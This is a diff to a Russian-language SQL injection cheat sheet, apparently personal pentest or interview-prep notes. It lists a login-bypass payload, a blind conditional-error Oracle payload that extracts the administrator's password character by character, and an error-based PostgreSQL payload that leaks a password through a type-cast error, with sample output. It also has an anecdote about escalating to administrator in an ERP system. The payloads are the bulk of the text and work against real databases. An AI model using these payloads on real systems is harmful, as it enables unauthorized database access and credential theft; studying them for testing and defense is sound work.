@@ -18,6 +18,10 @@
 
 ## 🔥 **2. Базовые Payloads (что использовать)**
 
+*** ЗАПОМНИТЬ ****
+
+*** В СЛУЧАЕ ЕСЛИ PAYLOAD ЧИСЛОВОЙ, ТО НЕ НУЖНО ВНЕДРЯТЬ КАВЫЧКУ, ИНАЧЕ БУДЕТ ОШИБКА ТИПА ДАННЫХ!!!! ***
+
 | Payload | Что делает |
 | :--- | :--- |
 | `' OR '1'='1` | Обход логина (всегда TRUE) |
@@ -76,9 +80,17 @@
  *«SQLi — одна из самых опасных уязвимостей OWASP Top 10. В своей практике я сталкивался с ней в ERP-системе: запросы строились через самописную ORM без параметризации. Я смог выполнить произвольные запросы к БД, получить данные пользователей и повысить привилегии до администратора. Исправляли через внедрение параметризованных запросов и изоляцию API-слоя».* 🚀
 
 
- ### CUSTOM PAYLOADS
+### CUSTOM PAYLOADS
 
- # BLIND SQL WITH CONDITIONAL RESPONSE
+# BLIND SQL WITH CONDITIONAL RESPONSE
 
- # ORACLE:
- param=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+## ORACLE:
+param=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+# Visible error based SQLI
+
+## POSTGRESQL:
+param=s'||(SELECT password FROM users LIMIT 1)::INTEGER -- 
+Ответ c раскрытием пароля:
+ERROR: invalid input syntax for type integer: "secretpass123"
